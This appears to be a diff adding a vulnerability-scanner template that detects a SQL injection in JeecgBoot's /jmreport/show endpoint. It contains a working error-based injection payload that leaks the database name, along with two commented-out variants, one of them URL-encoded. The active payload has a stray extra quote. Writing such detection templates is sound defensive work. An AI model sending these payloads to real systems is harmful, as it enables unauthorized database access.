@@ -1,0 +1,59 @@
+id: jeecg-boot-jmreport-show-sqli
+
+info:
+  name: JeecgBoot 3.5.0 and 3.5.2 - SQL Injection
+  author: carrypan
+  severity: high
+  tags: jeecg,sqli
+
+http:
+  - raw:
+      - |
+        POST /jmreport/show HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\""1'and(updatexml(0x3e,concat(1,(database())),1))='\"}"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - 'contains(body, "XPATH syntax error:")'
+          - 'contains(body, "SQL")'
+          - 'contains(header, "application/json")'
+          - 'status_code == 200'
+        condition: and
+        
+  # - raw:
+  #     - |
+  #       POST /jeecg-boot/jmreport/show HTTP/1.1
+  #       Host: {{Hostname}}
+  #       Content-Type: application/json;charset=UTF-8
+
+  #       {"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1'and(updatexml(0x3e,concat(1,(database())),1))='\"}"}
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         # - 'contains(body, "XPATH syntax error:")'
+  #         - 'contains(body, "SQL")'
+  #         - 'contains(header, "application/json")'
+  #         - 'status_code == 200'
+  #       condition: and
+
+  # - raw:
+  #     - |       
+  #       GET /jeecg-boot/jmreport/show?apiUrl=&id=961455b47c0b86dc961e90b5893bff05&params=%7b%22%69%64%22%3a%22%31%27%61%6e%64%28%75%70%64%61%74%65%78%6d%6c%28%30%78%33%61%2c%63%6f%6e%63%61%74%28%31%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%2c%31%29%29%3d%27%22%7d HTTP/1.1
+  #       Host: {{Hostname}}
+  #       Connection: close
+  #       Accept-Encoding: gzip
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         # - 'contains(body, "XPATH syntax error:")'
+  #         - 'contains(body, "SQL")'
+  #         - 'contains(header, "application/json")'
+  #         - 'status_code == 200'
+  #       condition: and
+
